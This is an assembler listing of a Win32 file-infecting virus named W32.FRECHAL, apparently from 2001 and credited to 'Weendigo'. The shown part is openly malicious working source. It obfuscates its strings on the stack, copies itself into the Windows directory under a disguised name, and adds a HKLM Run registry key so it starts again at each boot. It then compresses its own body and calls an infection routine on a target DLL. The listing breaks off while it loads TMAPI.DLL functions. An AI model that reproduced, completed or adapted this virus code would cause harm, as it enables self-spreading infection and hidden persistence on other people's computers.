Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 1
FLECHAL.asm



      1					    ;		   W32.FRECHAL	    By:	Weendigo
      2
      3					    .586p
      4	00000000			    .model flat
      5
      6					    DEBUG equ yes
      7
      8					    include STRUC.INC
1     9					    callx macro	x
1    10					    extrn x:proc
1    11					    call x
1    12					    endm
1    13
1    14					    esp_crypt macro x
1    15					    mov	eax, not x
1    16					    not	eax
1    17					    push eax
1    18					    mov	eax, esp
1    19					    endm
1    20
1    21					    stosd_crypt	macro x, y
1    22					    push edi eax
1    23					    mov	edi, x
1    24					    mov	eax, not y
1    25					    not	eax
1    26					    stosd
1    27					    pop	eax edi
1    28					    add	x, 4
1    29					    endm
1    30
1    31					    x_not macro	x
1    32					    irpc z, <x>
1    33					    y =	not "&z"
1    34					    db y
1    35					    endm
1    36					    db 0ffh
1    37					    endm
1    38
1    39					    string_decrypt macro x, y
1    40					    push edi ecx
1    41					    mov	edi, offset x
1    42					    mov	ecx, y
1    43					    dec	ecx
1    44					    not	byte ptr [edi]
1    45					    inc	edi
1    46					    loop $-3
1    47					    pop	ecx edi
1    48					    endm
1    49
1    50					    crash macro	;  DEBUG
1    51					    mov	esp, 0
1    52					    call $
1    53					    endm
1    54
1    55					 x_push_first		 macro	 r
1    56								 xor	 r, r
1    57								 _reg =	0
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 2
FLECHAL.asm



1    58								 endm
1    59
1    60					 x_push_next		 macro	 q, r, x
1    61								 if q eq 0
1    62								 sub	 r, _reg - x
1    63								 endif
1    64								 if (q eq 1) or	(q eq 3)
1    65								 xor	 r, _reg xor x
1    66								 endif
1    67								 if q eq 2
1    68								 add	 r, x -	_reg
1    69								 endif
1    70								 push	 r
1    71								 _reg =	x
1    72								 endm
1    73
1    74					 x_push			 macro	 r, x
1    75								 x_push_first r
1    76								 _xsize	= 0
1    77								 l	 = 0
1    78								 irpc	 c, <x>
1    79								 l	 = l + 1
1    80								 endm
1    81								 j = 0
1    82								 s = 0
1    83								 l0 = l
1    84								 if (l0	and 3) ne 0
1    85								 j = j shl 8 + "x"
1    86								 s = s + 8
1    87								 l0 = l0 + 1
1    88								 endif
1    89								 if (l0	and 3) ne 0
1    90								 j = j shl 8 + "y"
1    91								 s = s + 8
1    92								 l0 = l0 + 1
1    93								 endif
1    94								 if (l0	and 3) ne 0
1    95								 j = j shl 8 + "z"
1    96								 s = s + 8
1    97								 l0 = l0 + 1
1    98								 endif
1    99								 q = 0
1   100								 i	 = l - 1
1   101								 irpc	 c1, <x>
1   102								   t	   = 0
1   103								   irpc	   c, <x>
1   104								     k = "&c"
1   105								     if	     k eq "~"	 ; zero
1   106								       k = 0
1   107								     endif
1   108								     if	     k eq "|"	 ; space
1   109								       k = 32
1   110								     endif
1   111								     if	     k eq "ö"	 ; cr
1   112								       k = 13
1   113								     endif
1   114								     if	     k eq "÷"	 ; lf
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 3
FLECHAL.asm



1   115								       k = 10
1   116								     endif
1   117								     if	t eq i
1   118								       j = j shl 8
1   119								       if k ne 0
1   120								       j = j + k
1   121								       endif
1   122								       s = s + 8
1   123								       if s eq 32
1   124									 _xsize	= _xsize + 4
1   125									 x_push_next q,r,j
1   126									 q = q + 1
1   127									 if q eq 4
1   128									   q = 0
1   129									 endif
1   130									 s = 0
1   131									 j = 0
1   132								       endif
1   133								       exitm
1   134								     endif
1   135								     t	   = t + 1
1   136								   endm	l irpc
1   137								   i = i - 1
1   138								 endm ;	irpc
1   139								 if s ne 0
1   140								   error
1   141								 endif
1   142								 mov r,	esp
1   143								 endm ;	x_push
1   144
1   145					 x_pop			 macro
1   146								 lea	 esp, [esp + _xsize]
1   147								 endm
1   148
1   149		  =0000			    NULL		 equ 0
1   150					    FALSE		 equ NULL
1   151		  =0001			    TRUE		 equ 1
1   152		  =0104			    MAX_PATH		 equ 260
1   153		  =80000002		    HKEY_LOCAL_MACHINE	 equ 80000002h
1   154					    ERROR_SUCCESS	 equ NULL
1   155		  =000F003F		    KEY_ALL_ACCESS	 equ 0F003FH
1   156		  =0001			    REG_SZ		 equ 1
1   157					    REG_NONE		 equ NULL
1   158		  =0005			    SW_SHOW		 equ 5
1   159		  =0002			    FILE_MAP_WRITE	 equ 0002h
1   160		  =0004			    FILE_MAP_READ	 equ 0004h
1   161		  =0080			    FILE_ATTRIBUTE_NORMAL      equ 80h
1   162		  =0010			    FILE_ATTRIBUTE_DIRECTORY   equ 10h
1   163		  =0800			    FILE_ATTRIBUTE_COMPRESSED  equ 800h
1   164		  =80000000		    GENERIC_READ	 equ 80000000h
1   165		  =40000000		    GENERIC_WRITE	 equ 40000000h
1   166		  =0002			    PAGE_READONLY	 equ 2
1   167		  =0004			    PAGE_READWRITE	 equ 4
1   168		  =0002			    CREATE_ALWAYS	 equ 2
1   169		  =0003			    OPEN_EXISTING	 equ 3
1   170		  =0001			    FILE_SHARE_READ	 equ 1h
1   171		  =0000			    FILE_BEGIN		 equ 0
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 4
FLECHAL.asm



1   172		  =0000			    IMAGE_DIRECTORY_ENTRY_EXPORT  equ  0
1   173		  =0001			    IMAGE_DIRECTORY_ENTRY_IMPORT  equ  1
1   174		  =0040			    GMEM_ZEROINIT	 equ 40h
1   175		  =0A00			    HEADER_SIZE		 equ 0A00h
1   176		  =2600			    CODE_SIZE		 equ 2600h
1   177		  =0040			    PAGE_EXECUTE_READWRITE  equ	40h
1   178		  =0080			    PAGE_EXECUTE_WRITECOPY  equ	80h
1   179
1   180	00000000			    FILETIME STRUCT
1   181	00000000  01*(????????)		      dwLowDateTime	DWORD	   ?
1   182	00000004  01*(????????)		      dwHighDateTime	DWORD	   ?
1   183	00000008			    FILETIME ENDS
1   184
1   185		  =		      +	    IMAGE_OPTIONAL_HEADER  equ	<IMAGE_OPTIONAL_HEADER32>
    186		  IMAGE_OPTIONAL_HEADER
    187		  32
1   188
1   189	00000000			    IMAGE_DATA_DIRECTORY STRUCT
1   190	00000000  01*(????????)		      VirtualAddress	DWORD	   ?
1   191	00000004  01*(????????)		      isize		DWORD	   ?
1   192	00000008			    IMAGE_DATA_DIRECTORY ENDS
1   193
1   194		  =0010			    IMAGE_NUMBEROF_DIRECTORY_ENTRIES equ 16
1   195
1   196	00000000			    IMAGE_OPTIONAL_HEADER32 STRUCT
1   197	00000000  01*(????)		      Magic			    WORD       ?
1   198	00000002  01*(??)		      MajorLinkerVersion	    BYTE       ?
1   199	00000003  01*(??)		      MinorLinkerVersion	    BYTE       ?
1   200	00000004  01*(????????)		      SizeOfCode		    DWORD      ?
1   201	00000008  01*(????????)		      SizeOfInitializedData	    DWORD      ?
1   202	0000000C  01*(????????)		      SizeOfUninitializedData	    DWORD      ?
1   203	00000010  01*(????????)		      AddressOfEntryPoint	    DWORD      ?
1   204	00000014  01*(????????)		      BaseOfCode		    DWORD      ?
1   205	00000018  01*(????????)		      BaseOfData		    DWORD      ?
1   206	0000001C  01*(????????)		      ImageBase			    DWORD      ?
1   207	00000020  01*(????????)		      SectionAlignment		    DWORD      ?
1   208	00000024  01*(????????)		      FileAlignment		    DWORD      ?
1   209	00000028  01*(????)		      MajorOperatingSystemVersion   WORD       ?
1   210	0000002A  01*(????)		      MinorOperatingSystemVersion   WORD       ?
1   211	0000002C  01*(????)		      MajorImageVersion		    WORD       ?
1   212	0000002E  01*(????)		      MinorImageVersion		    WORD       ?
1   213	00000030  01*(????)		      MajorSubsystemVersion	    WORD       ?
1   214	00000032  01*(????)		      MinorSubsystemVersion	    WORD       ?
1   215	00000034  01*(????????)		      Win32VersionValue		    DWORD      ?
1   216	00000038  01*(????????)		      SizeOfImage		    DWORD      ?
1   217	0000003C  01*(????????)		      SizeOfHeaders		    DWORD      ?
1   218	00000040  01*(????????)		      CheckSum			    DWORD      ?
1   219	00000044  01*(????)		      Subsystem			    WORD       ?
1   220	00000046  01*(????)		      DllCharacteristics	    WORD       ?
1   221	00000048  01*(????????)		      SizeOfStackReserve	    DWORD      ?
1   222	0000004C  01*(????????)		      SizeOfStackCommit		    DWORD      ?
1   223	00000050  01*(????????)		      SizeOfHeapReserve		    DWORD      ?
1   224	00000054  01*(????????)		      SizeOfHeapCommit		    DWORD      ?
1   225	00000058  01*(????????)		      LoaderFlags		    DWORD      ?
1   226	0000005C  01*(????????)		      NumberOfRvaAndSizes	    DWORD      ?
1   227	00000060  01*(10*(08*(??)))	      DataDirectory		    IMAGE_DATA_DIRECTORY IMAGE_NUMBEROF_DIRECTORY_ENTRIES   +
    228					 dup(<?>)
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 5
FLECHAL.asm



1   229	000000E0			    IMAGE_OPTIONAL_HEADER32 ENDS
1   230
1   231	00000000			    IMAGE_FILE_HEADER STRUCT
1   232	00000000  01*(????)		      Machine		    WORD    ?
1   233	00000002  01*(????)		      NumberOfSections	    WORD    ?
1   234	00000004  01*(????????)		      TimeDateStamp	    DWORD   ?
1   235	00000008  01*(????????)		      PointerToSymbolTable  DWORD   ?
1   236	0000000C  01*(????????)		      NumberOfSymbols	    DWORD   ?
1   237	00000010  01*(????)		      SizeOfOptionalHeader  WORD    ?
1   238	00000012  01*(????)		      Characteristics	    WORD    ?
1   239	00000014			    IMAGE_FILE_HEADER ENDS
1   240
1   241	00000000			    IMAGE_NT_HEADERS STRUCT
1   242	00000000  01*(????????)		      Signature		DWORD			?
1   243	00000004  01*(14*(??))		      FileHeader	IMAGE_FILE_HEADER	<?>
1   244	00000018  01*(E0*(??))		      OptionalHeader	IMAGE_OPTIONAL_HEADER32	<?>
1   245	000000F8			    IMAGE_NT_HEADERS ENDS
1   246
1   247	00000000			    IMAGE_EXPORT_DIRECTORY STRUCT
1   248	00000000  01*(????????)		      _Characteristics		DWORD	   ?
1   249	00000004  01*(????????)		      TimeDateStamp		DWORD	   ?
1   250	00000008  01*(????)		      MajorVersion		WORD	   ?
1   251	0000000A  01*(????)		      MinorVersion		WORD	   ?
1   252	0000000C  01*(????????)		      nName			DWORD	   ?
1   253	00000010  01*(????????)		      nBase			DWORD	   ?
1   254	00000014  01*(????????)		      NumberOfFunctions		DWORD	   ?
1   255	00000018  01*(????????)		      NumberOfNames		DWORD	   ?
1   256	0000001C  01*(????????)		      AddressOfFunctions	DWORD	   ?
1   257	00000020  01*(????????)		      AddressOfNames		DWORD	   ?
1   258	00000024  01*(????????)		      AddressOfNameOrdinals	DWORD	   ?
1   259	00000028			    IMAGE_EXPORT_DIRECTORY ENDS
1   260
1   261	00000000			    IMAGE_SECTION_HEADER STRUC			       ;
1   262	00000000  01*(08*(??))			SH_Name			DB 8 DUP(?)	       ;
1   263	00000008  01*(????????)			SH_VirtualSize		DD ?		       ;
1   264	0000000C  01*(????????)			SH_VirtualAddress	DD ?		       ;
1   265	00000010  01*(????????)			SH_SizeOfRawData	DD ?		       ;
1   266	00000014  01*(????????)			SH_PointerToRawData	DD ?		       ;
1   267	00000018  01*(????????)			SH_PointerToRelocations	DD ?		       ;
1   268	0000001C  01*(????????)			SH_PointerToLinenumbers	DD ?		       ;
1   269	00000020  01*(????)			SH_NumberOfRelocations	DW ?		       ;
1   270	00000022  01*(????)			SH_NumberOfLinenumbers	DW ?		       ;
1   271	00000024  01*(????????)			SH_Characteristics	DD ?		       ;
1   272	00000028			    IMAGE_SECTION_HEADER ENDS			       ;
1   273
1   274	00000000			    IMAGE_IMPORT_DESCRIPTOR STRUCT
1   275	00000000  01*(????????)			OriginalFirstThunk  dd ?  ;  Hint/Name Table
1   276	00000004  01*(????????)			TimeDateStamp	    dd ?
1   277	00000008  01*(????????)			ForwarderChain	    dd ?
1   278	0000000C  01*(????????)			Name1		    dd ?
1   279	00000010  01*(????????)			FirstThunk	    dd ?
1   280	00000014			    IMAGE_IMPORT_DESCRIPTOR ENDS
1   281
1   282					 ;   mov eax, 1
1   283					 ;   mov ecx, 2
1   284					 ;   mov edx, 3
1   285					 ;   mov ebx, 4
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 6
FLECHAL.asm



1   286					 ;   mov ebp, 5
1   287					 ;   mov esi, 6
1   288					 ;   mov edi, 7
1   289
1   290
    291
    292	00000000			    .code
    293
    294	00000000			    _start:
    295
    296	00000000  89 25	000AC5F0r	    mov	orig_esp, esp
    297	00000006  C7 05	00002EB8r     +	    mov	l_size,	(offset	l_end -	offset l_start)
    298		  00000510
    299	00000010  E8 0000295F		    call rnd_ini
    300
    301					    ;  decrypt pack engine header
    302
    303	00000015  B9 00000100		    mov	ecx, 256
    304	0000001A  68 00002EC0r		    push offset	aplib@006
    305	0000001F  58			    pop	eax
    306
    307	00000020			    _ap_not:
    308
    309	00000020  F6 10			    not	byte ptr [eax]
    310	00000022  40			    inc	eax
    311	00000023  E2 FB			    loop _ap_not
    312
    313					    x_push eax,	Flechal~
1   314								 x_push_first eax
2   315	00000025  33 C0						 xor	 eax, eax
3   316									 x_push_next q,eax,j
4   317	00000027  2D FF939E98					 sub	 eax, _reg - j
4   318	0000002C  50						 push	 eax
3   319									 x_push_next q,eax,j
4   320	0000002D  35 63090D2E					 xor	 eax, _reg xor j
4   321	00000032  50						 push	 eax
1   322	00000033  8B C4						 mov eax, esp
    323	00000035  A3 000AC5F4r		    mov	lpszSubKey_1, eax
    324
    325	0000003A  E8 0000040D		    call _openmutex
    326	0000003F  0F 85	000000E1	    jnz	_exit_com_del
    327
    328	00000045  6A 00			    push NULL
    329					    callx GetModuleHandleA
1   330	00000047  E8 00000000e		    call GetModuleHandleA
    331
    332	0000004C  85 C0			    test eax, eax
    333	0000004E  0F 84	000000D2	    jz _exit_com_del
    334
    335	00000054  68 00000103		    push MAX_PATH - 1
    336	00000059  68 00000000r		    push offset	NAM_flechal
    337	0000005E  50			    push eax
    338					    callx GetModuleFileNameA
1   339	0000005F  E8 00000000e		    call GetModuleFileNameA
    340
    341	00000064  85 C0			    test eax, eax
    342	00000066  0F 84	000000BA	    jz _exit_com_del
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 7
FLECHAL.asm



    343
    344					    ; try to retrieve our registry key
    345					    ; and compare it with the current
    346					    ; filename
    347
    348	0000006C  50			    push eax
    349	0000006D  8B CC			    mov	ecx, esp
    350	0000006F  50			    push eax
    351	00000070  8B EC			    mov	ebp, esp
    352					    x_push eax,	Software\Microsoft\Windows\CurrentVersion\Run~
1   353								 x_push_first eax
2   354	00000072  33 C0						 xor	 eax, eax
3   355									 x_push_next q,eax,j
4   356	00000074  2D 8786FF92					 sub	 eax, _reg - j
4   357	00000079  50						 push	 eax
3   358									 x_push_next q,eax,j
4   359	0000007A  35 0D2B5C00					 xor	 eax, _reg xor j
4   360	0000007F  50						 push	 eax
3   361									 x_push_next q,eax,j
4   362	00000080  05 FA171704					 add	 eax, j	- _reg
4   363	00000085  50						 push	 eax
3   364									 x_push_next q,eax,j
4   365	00000086  35 0A3F071C					 xor	 eax, _reg xor j
4   366	0000008B  50						 push	 eax
3   367									 x_push_next q,eax,j
4   368	0000008C  2D FFE401F9					 sub	 eax, _reg - j
4   369	00000091  50						 push	 eax
3   370									 x_push_next q,eax,j
4   371	00000092  35 262E0102					 xor	 eax, _reg xor j
4   372	00000097  50						 push	 eax
3   373									 x_push_next q,eax,j
4   374	00000098  05 2C07FAF2					 add	 eax, j	- _reg
4   375	0000009D  50						 push	 eax
3   376									 x_push_next q,eax,j
4   377	0000009E  35 38381A0F					 xor	 eax, _reg xor j
4   378	000000A3  50						 push	 eax
3   379									 x_push_next q,eax,j
4   380	000000A4  2D E7E904F4					 sub	 eax, _reg - j
4   381	000000A9  50						 push	 eax
3   382									 x_push_next q,eax,j
4   383	000000AA  35 0C1A222E					 xor	 eax, _reg xor j
4   384	000000AF  50						 push	 eax
3   385									 x_push_next q,eax,j
4   386	000000B0  05 0209141B					 add	 eax, j	- _reg
4   387	000000B5  50						 push	 eax
3   388									 x_push_next q,eax,j
4   389	000000B6  35 11140E24					 xor	 eax, _reg xor j
4   390	000000BB  50						 push	 eax
1   391	000000BC  8B C4						 mov eax, esp
    392
    393	000000BE  51			    push ecx
    394	000000BF  55			    push ebp
    395	000000C0  6A 00			    push 0
    396	000000C2  68 000F003F		    push KEY_ALL_ACCESS
    397	000000C7  6A 00			    push 0
    398	000000C9  6A 00			    push 0
    399	000000CB  6A 00			    push 0
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 8
FLECHAL.asm



    400	000000CD  50			    push eax
    401	000000CE  68 80000002		    push HKEY_LOCAL_MACHINE
    402					    callx RegCreateKeyExA
1   403	000000D3  E8 00000000e		    call RegCreateKeyExA
    404
    405					    x_pop
1   406	000000D8  8D 64	24 30					 lea	 esp, [esp + _xsize]
    407	000000DC  8B 6D	00		    mov	ebp, [ebp]
    408	000000DF  81 EC	000000FC	    sub	esp, MAX_PATH -	8
    409	000000E5  8B DC			    mov	ebx, esp
    410	000000E7  68 00000103		    push MAX_PATH - 1
    411	000000EC  8B C4			    mov	eax, esp
    412
    413	000000EE  50			    push eax
    414	000000EF  53			    push ebx
    415	000000F0  6A 00			    push REG_NONE
    416	000000F2  6A 00			    push NULL
    417	000000F4  FF 35	000AC5F4r	    push [lpszSubKey_1]
    418	000000FA  55			    push ebp
    419					    callx RegQueryValueExA
1   420	000000FB  E8 00000000e		    call RegQueryValueExA
    421
    422	00000100  59			    pop	ecx
    423	00000101  83 F8	00		    cmp	eax, ERROR_SUCCESS
    424	00000104  75 4F			    jne	__install
    425
    426					    ; compare strings
    427
    428	00000106  53			    push ebx
    429	00000107  68 00000000r		    push offset	NAM_flechal
    430					    callx lstrcmpi
1   431	0000010C  E8 00000000e		    call lstrcmpi
    432
    433	00000111  81 EC	FFFFFEFC	    sub	esp, - MAX_PATH
    434
    435	00000117  85 C0			    test eax, eax
    436	00000119  0F 84	000000DF	    jz _default
    437
    438	0000011F  E8 00000328		    call _openmutex
    439	00000124  74 35			    jz _install
    440
    441	00000126			    _exit_com_del:
    442
    443					    ; wait 2 seconds and delete	itself
    444
    445	00000126  60			    pushad
    446					    x_push eax,	EXIT~
1   447								 x_push_first eax
2   448	00000127  33 C0						 xor	 eax, eax
3   449									 x_push_next q,eax,j
4   450	00000129  2D 87868600					 sub	 eax, _reg - j
4   451	0000012E  50						 push	 eax
3   452									 x_push_next q,eax,j
4   453	0000012F  35 2C302245					 xor	 eax, _reg xor j
4   454	00000134  50						 push	 eax
1   455	00000135  8B C4						 mov eax, esp
    456	00000137  6A 00	50 50 6A 00	    push 0 eax eax 0
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 9
FLECHAL.asm



    457	0000013D  FF 15	00002EBCr	    call [MessageBoxA]
    458					    x_pop
1   459	00000143  8D 64	24 08					 lea	 esp, [esp + _xsize]
    460	00000147  61			    popad
    461
    462	00000148  8B 25	000AC5F0r	    mov	esp, orig_esp
    463
    464	0000014E  6A FF			    push -1
    465					    callx ExitProcess
1   466	00000150  E8 00000000e		    call ExitProcess
    467
    468	00000155			    __install:
    469
    470	00000155  81 EC	FFFFFEFC	    sub	esp, - MAX_PATH	 ;  RegQueryValueExA
    471
    472	0000015B			    _install:
    473
    474					    ; we've to install flechal
    475
    476	0000015B  81 EC	00000104	    sub	esp, MAX_PATH
    477	00000161  8B DC			    mov	ebx, esp
    478
    479	00000163  68 00000103		    push MAX_PATH - 1
    480	00000168  53			    push ebx
    481					    callx GetWindowsDirectoryA
1   482	00000169  E8 00000000e		    call GetWindowsDirectoryA
    483
    484	0000016E  6A 00			    push FALSE
    485	00000170  53			    push ebx
    486	00000171  68 00000000r		    push offset	NAM_flechal
    487
    488	00000176  53			    push ebx
    489	00000177  8D 1C	18		    lea	ebx, [eax+ebx]
    490					    x_push esi,	\COMMAND\NBKSULF.EXE~
1   491								 x_push_first esi
2   492	0000017A  33 F6						 xor	 esi, esi
3   493									 x_push_next q,esi,j
4   494	0000017C  81 EE	87868600				 sub	 esi, _reg - j
4   495	00000182  56						 push	 esi
3   496									 x_push_next q,esi,j
4   497	00000183  81 F6	3D213F2E				 xor	 esi, _reg xor j
4   498	00000189  56						 push	 esi
3   499									 x_push_next q,esi,j
4   500	0000018A  81 C6	00F41025				 add	 esi, j	- _reg
4   501	00000190  56						 push	 esi
3   502									 x_push_next q,esi,j
4   503	00000191  81 F6	0D0E1B0F				 xor	 esi, _reg xor j
4   504	00000197  56						 push	 esi
3   505									 x_push_next q,esi,j
4   506	00000198  81 EE	06F40D0F				 sub	 esi, _reg - j
4   507	0000019E  56						 push	 esi
3   508									 x_push_next q,esi,j
4   509	0000019F  81 F6	09010211				 xor	 esi, _reg xor j
4   510	000001A5  56						 push	 esi
1   511	000001A6  8B F4						 mov esi, esp
    512	000001A8  8B FB			    mov	edi, ebx
    513	000001AA  B9 00000015		    mov	ecx, 21
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 10
FLECHAL.asm



    514	000001AF  F3> A4		    rep	movsb
    515					    x_pop
1   516	000001B1  8D 64	24 18					 lea	 esp, [esp + _xsize]
    517	000001B5  5B			    pop	ebx
    518					    callx CopyFileA
1   519	000001B6  E8 00000000e		    call CopyFileA
    520
    521	000001BB  48			    dec	eax
    522	000001BC  74 0B			    jz _copydone
    523
    524	000001BE  81 EC	FFFFFEFC	    sub	esp, - MAX_PATH
    525	000001C4  E9 FFFFFF5D		    jmp	_exit_com_del
    526
    527	000001C9			    _copydone:
    528
    529	000001C9  53			    push ebx
    530					    callx lstrlenA
1   531	000001CA  E8 00000000e		    call lstrlenA
    532
    533	000001CF  50			    push eax
    534	000001D0  53			    push ebx
    535	000001D1  6A 01			    push REG_SZ
    536	000001D3  6A 00			    push NULL
    537	000001D5  FF 35	000AC5F4r	    push [lpszSubKey_1]
    538	000001DB  55			    push ebp
    539					    callx RegSetValueExA
1   540	000001DC  E8 00000000e		    call RegSetValueExA
    541
    542	000001E1  6A 05			    push SW_SHOW
    543	000001E3  6A 00			    push NULL
    544	000001E5  6A 00			    push NULL
    545	000001E7  53			    push ebx
    546	000001E8  6A 00			    push NULL
    547	000001EA  6A 00			    push NULL
    548					    callx ShellExecuteA
1   549	000001EC  E8 00000000e		    call ShellExecuteA
    550
    551	000001F1			    _exit:
    552
    553	000001F1  8B 25	000AC5F0r	    mov	esp, orig_esp
    554
    555	000001F7  6A FF			    push -1
    556					    callx ExitProcess
1   557	000001F9  E8 00000000e		    call ExitProcess
    558
    559	000001FE			    _default:
    560
    561	000001FE  2B C0			    sub	eax, eax
    562	00000200  A3 00000154r		    mov	hWnd_imagehlp, eax
    563	00000205  A3 00000108r		    mov	hWnd_tmapi, eax
    564
    565					    x_push eax,	_flechal1.0~
1   566								 x_push_first eax
2   567	0000020A  33 C0						 xor	 eax, eax
3   568									 x_push_next q,eax,j
4   569	0000020C  2D FFCFD1CF					 sub	 eax, _reg - j
4   570	00000211  50						 push	 eax
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 11
FLECHAL.asm



3   571									 x_push_next q,eax,j
4   572	00000212  35 6C514652					 xor	 eax, _reg xor j
4   573	00000217  50						 push	 eax
3   574									 x_push_next q,eax,j
4   575	00000218  05 F90AFDFC					 add	 eax, j	- _reg
4   576	0000021D  50						 push	 eax
1   577	0000021E  8B C4						 mov eax, esp
    578	00000220  50			    push eax
    579	00000221  6A 01			    push TRUE
    580	00000223  6A 00			    push NULL
    581					    callx CreateMutexA
1   582	00000225  E8 00000000e		    call CreateMutexA
    583					    x_pop
1   584	0000022A  8D 64	24 0C					 lea	 esp, [esp + _xsize]
    585
    586					    ;  we've to	init some fields
    587
    588	0000022E  68 00000000r		    push offset	NAM_flechal
    589	00000233  E8 00000EC1		    call _open_read
    590
    591	00000238  85 C0			    test eax, eax
    592	0000023A  74 B5			    jz _exit
    593
    594	0000023C  8B 0D	0000013Cr	    mov	ecx, _file_size
    595	00000242  49			    dec	ecx
    596	00000243  6A 00			    push 0
    597	00000245  68 0000C1C4r		    push offset	workmem
    598	0000024A  51			    push ecx
    599	0000024B  68 000061C4r		    push offset	_viral_temp_buffer_1 ;	output
    600	00000250  50			    push eax
    601	00000251  E8 000011E3		    call _ap_pack
    602
    603	00000256  A3 000061C0r		    mov	_viral_temp_sz,	eax
    604
    605	0000025B  85 C0			    test eax, eax
    606	0000025D  74 92			    jz _exit
    607
    608					    x_push eax,	D:\flechal\GOAT.DLL~
1   609								 x_push_first eax
2   610	0000025F  33 C0						 xor	 eax, eax
3   611									 x_push_next q,eax,j
4   612	00000261  2D FFB3B3BC					 sub	 eax, _reg - j
4   613	00000266  50						 push	 eax
3   614									 x_push_next q,eax,j
4   615	00000267  35 2E180D0B					 xor	 eax, _reg xor j
4   616	0000026C  50						 push	 eax
3   617									 x_push_next q,eax,j
4   618	0000026D  05 19082B12					 add	 eax, j	- _reg
4   619	00000272  50						 push	 eax
3   620									 x_push_next q,eax,j
4   621	00000273  35 2F3F090D					 xor	 eax, _reg xor j
4   622	00000278  50						 push	 eax
3   623									 x_push_next q,eax,j
4   624	00000279  2D 02072B28					 sub	 eax, _reg - j
4   625	0000027E  50						 push	 eax
1   626	0000027F  8B C4						 mov eax, esp
    627	00000281  50			    push eax
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 12
FLECHAL.asm



    628	00000282  E8 000001EF		    call _infect
    629					    x_pop
1   630	00000287  8D 64	24 14					 lea	 esp, [esp + _xsize]
    631
    632	0000028B  6A FF			    push -1
    633					    callx ExitProcess
1   634	0000028D  E8 00000000e		    call ExitProcess
    635
    636	00000292  60			    pushad
    637					    x_push eax,	flechal1.0~
1   638								 x_push_first eax
2   639	00000293  33 C0						 xor	 eax, eax
3   640									 x_push_next q,eax,j
4   641	00000295  2D 87FFCFD2					 sub	 eax, _reg - j
4   642	0000029A  50						 push	 eax
3   643									 x_push_next q,eax,j
4   644	0000029B  35 496C5146					 xor	 eax, _reg xor j
4   645	000002A0  50						 push	 eax
3   646									 x_push_next q,eax,j
4   647	000002A1  05 31F90AFE					 add	 eax, j	- _reg
4   648	000002A6  50						 push	 eax
1   649	000002A7  8B C4						 mov eax, esp
    650	000002A9  6A 00	50 50 6A 00	    push 0 eax eax 0
    651	000002AF  FF 15	00002EBCr	    call [MessageBoxA]
    652					    x_pop
1   653	000002B5  8D 64	24 0C					 lea	 esp, [esp + _xsize]
    654	000002B9  61			    popad
    655
    656					    x_push eax,	TMAPI.DLL~
1   657								 x_push_first eax
2   658	000002BA  33 C0						 xor	 eax, eax
3   659									 x_push_next q,eax,j
4   660	000002BC  2D 8786FFB4					 sub	 eax, _reg - j
4   661	000002C1  50						 push	 eax
3   662									 x_push_next q,eax,j
4   663	000002C2  35 343D2E05					 xor	 eax, _reg xor j
4   664	000002C7  50						 push	 eax
3   665									 x_push_next q,eax,j
4   666	000002C8  05 03FD1F0B					 add	 eax, j	- _reg
4   667	000002CD  50						 push	 eax
1   668	000002CE  8B C4						 mov eax, esp
    669	000002D0  50			    push eax
    670					    callx LoadLibraryA
1   671	000002D1  E8 00000000e		    call LoadLibraryA
    672					    x_pop
1   673	000002D6  8D 64	24 0C					 lea	 esp, [esp + _xsize]
    674
    675	000002DA  A3 00000108r		    mov	hWnd_tmapi, eax
    676
    677	000002DF  85 C0			    test eax, eax
    678	000002E1  0F 84	00000160	    jz _out_tmapi
    679
    680					    x_push eax,	InitTmTable~
1   681								 x_push_first eax
2   682	000002E7  33 C0						 xor	 eax, eax
3   683									 x_push_next q,eax,j
4   684	000002E9  2D FF9A939E					 sub	 eax, _reg - j
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 13
FLECHAL.asm



4   685	000002EE  50						 push	 eax
3   686									 x_push_next q,eax,j
4   687	000002EF  35 61310136					 xor	 eax, _reg xor j
4   688	000002F4  50						 push	 eax
3   689									 x_push_next q,eax,j
4   690	000002F5  05 131500F5					 add	 eax, j	- _reg
4   691	000002FA  50						 push	 eax
1   692	000002FB  8B C4						 mov eax, esp
    693	000002FD  50			    push eax
    694	000002FE  FF 35	00000108r	    push hWnd_tmapi
    695					    callx GetProcAddress
1   696	00000304  E8 00000000e		    call GetProcAddress
    697					    x_pop
1   698	00000309  8D 64	24 0C					 lea	 esp, [esp + _xsize]
    699
    700	0000030D  A3 0000010Cr		    mov	InitTmTable, eax
    701
    702	00000312  85 C0			    test eax, eax
    703	00000314  0F 84	00000122	    jz _unloadtmapi
    704
    705					    x_push eax,	GetTmElementByIndex~
1   706								 x_push_first eax
2   707	0000031A  33 C0						 xor	 eax, eax
3   708									 x_push_next q,eax,j
4   709	0000031C  2D FF879A9C					 sub	 eax, _reg - j
4   710	00000321  50						 push	 eax
3   711									 x_push_next q,eax,j
4   712	00000322  35 6E311C26					 xor	 eax, _reg xor j
4   713	00000327  50						 push	 eax
3   714									 x_push_next q,eax,j
4   715	00000328  05 0624EC2B					 add	 eax, j	- _reg
4   716	0000032D  50						 push	 eax
3   717									 x_push_next q,eax,j
4   718	0000032E  35 11022000					 xor	 eax, _reg xor j
4   719	00000333  50						 push	 eax
3   720									 x_push_next q,eax,j
4   721	00000334  2D 10F7E026					 sub	 eax, _reg - j
4   722	00000339  50						 push	 eax
1   723	0000033A  8B C4						 mov eax, esp
    724	0000033C  50			    push eax
    725	0000033D  FF 35	00000108r	    push hWnd_tmapi
    726					    callx GetProcAddress
1   727	00000343  E8 00000000e		    call GetProcAddress
    728					    x_pop
1   729	00000348  8D 64	24 14					 lea	 esp, [esp + _xsize]
    730
    731	0000034C  A3 00000110r		    mov	GetTmElementByIndex, eax
    732
    733	00000351  85 C0			    test eax, eax
    734	00000353  0F 84	000000E3	    jz _unloadtmapi
    735
